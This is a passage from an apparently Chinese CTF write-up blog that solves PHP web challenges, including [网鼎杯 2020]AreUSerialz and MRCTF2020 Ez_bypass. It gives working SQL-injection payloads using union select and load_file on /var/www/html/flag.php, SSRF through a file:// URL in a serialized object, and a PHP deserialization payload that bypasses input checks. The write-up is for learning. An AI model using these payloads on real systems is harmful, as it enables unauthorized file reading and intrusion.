<span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地序列化：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";#访问请求一下判断是否存在</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:123;s:4:”blog”;s:22:”file:///var/www/html/flag.php”;}</p><p>利用注入将数据传入进去：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> union<span class="token comment" spellcheck="true">/**/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>'O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span>"UserInfo"<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"name"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"test"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>"age"<span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>"blog"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>"file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";}'#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>f12可以之间看见，右键源代码则需要base64再解密</p><p>解法二：利用没被过滤的函数load_file()</p><p>payload:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> union<span class="token comment" spellcheck="true">/**/</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2021-4-25"><a href="#2021-4-25" class="headerlink" title="2021-4-25"></a>2021-4-25</h1><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>先扫盲：</p><p><a href="https://www.w3school.com.cn/php/func_string_ord.asp" target="_blank" rel="noopener">PHP ord() 函数</a>其返回值为ASCII码</p><p>file_put_contents() 函数把一个字符串写入文件中，如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p><p>=== 需要值和其所属的类型都符合要求 ‘2’ === 2 false</p><p>== 值符合要求即可 ‘2’ == 2 true</p><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，这里面在传入反序列化后的参数会被调用到的函数只有</p><p>__construct()：当一个对象创建时被调用</p><p>__destruct()：当一个对象销毁时被调用</p><h3 id="1-绕过is-valid-函数"><a href="#1-绕过is-valid-函数" class="headerlink" title="1.绕过is_valid()函数"></a>1.绕过is_valid()函数</h3><p>函数is_valid($s)对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true，也就是这里：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>绕过方法：</p><p>针对与protected类型和private类型的属性存在不可打印字符：</p><p>protect分析：</p><pre><code>本来是sex结果上面出现的是*sex，而且*sex的长度是4，但是上面显示的是6，同样查找资料后发现protect属性序列化的时候格式是%00*%00sex(成员名)</code></pre><p>private分析：</p><pre><code>这样就发现本来是age结果上面出现的是testage，而且testage长度为7，但是上面显示的是9查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以age加了类名后变成了%00test%00age长度为9</code></pre><p>那么这里如果传出，对照<a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ASCII码表</a>32-125被定义为可显示字符，但是%00为认定为只占一个字符，所以不在32-125的队伍中，故必须修改成员属性为public，但是这里有给前提就是：<strong>PHP7.1以上版本对属性类型不敏感</strong>，所以才可以实现</p><p>7.1以下的绕过姿势：</p><p>当我们将不论是带有protected还是private的成员属性时：</p><pre><code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:7:&quot;oavinci&quot;;}</code></pre><p>只要将代表字符串个数的的s改为大写S，就可以实现将%00用16进制编码表示，变成00</p><h3 id="2-利用-destruct-来实现read-方法的调用"><a href="#2-利用-destruct-来实现read-方法的调用" class="headerlink" title="2.利用__destruct()来实现read()方法的调用"></a>2.利用__destruct()来实现read()方法的调用</h3><p>问题1：为什么非要调用read()方法</p><p>回答1：对比write()与read()</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先需要设置成员filename和content，然后判断content不能的字符串不能大于100，然后再将content的内容写入到我传入的filename的文件中，然后通过判断res的类型来执行output方法，但是如果按照这个逻辑的话，那么flag这辈子是出不来了，得到的结果要么successful，要么是failed，所以不可能是通过write方法了</p><p>问题2：那么如何调用read()方法呢？</p><p>回答2：利用可以调用的__destruct()来实现read()方法的调用</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>===很扎眼，考点为弱类型，如果op=一个字符型的2那么就把2变成1，然后调用process()方法：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先在刚才就被我们否定的write()函数，是绝对不能用的，所以op绝对不可以=1，所以想要保住op=2的前提下又绕过__destruct()函数，就要使用弱类型来实现，也就是说：</p><p>if($this-&gt;op == “2”) 这里的2可是整数型，可以是字符型，都返回true</p><p>if($this-&gt;op === “2”) 这里的2如果是整数型则返回false，只有字符型的时候才返回true</p><p>这样就可以给$op传入整数型2的值来实现即绕过了__destruct()函数，又能保证执行read()方法</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一个考点就是在遇到这个file_get_contents()函数的时候，结合php://filter/read=convert.base64-encode/resource=flag.php,等各种伪协议绕过姿势(我没有试)</p><p>然后可以本地环境来实验了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload：</p><pre><code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;}</code></pre><p>右键查看源代码得到flag</p><h1 id="2021-4-27"><a href="#2021-4-27" class="headerlink" title="2021-4-27"></a>2021-4-27</h1><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>题目源代码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$gg</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span 